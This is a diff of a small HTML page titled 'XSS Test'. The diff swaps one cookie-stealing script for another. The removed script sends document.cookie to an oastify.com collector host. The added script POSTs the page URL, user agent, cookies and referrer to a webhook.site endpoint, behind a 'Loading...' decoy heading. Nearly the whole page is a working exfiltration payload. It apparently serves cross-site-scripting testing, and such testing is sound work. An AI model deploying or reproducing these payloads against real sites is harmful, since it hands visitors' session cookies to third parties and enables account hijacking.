@@ -1,14 +1,18 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>XSS Test</title>
-</head>
-<body>
-  <h1>Hello, this is XSS Test Page</h1>
- <script>
-new Image().src = "https://rto7f7xpsqmmv8fas360tr2e45awynmc.oastify.com/" + document.cookie;
-</script>
-</body>
+<!-- Filename: xss.html -->
+<html>
+  <body>
+    <script>
+      fetch("https://webhook.site/3f4c49c6-9f0e-4953-be6b-a76de7a35312", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          url: window.location.href,
+          userAgent: navigator.userAgent,
+          cookies: document.cookie,
+          referrer: document.referrer
+        })
+      });
+    </script>
+    <h1>Loading...</h1>
+  </body>
 </html>
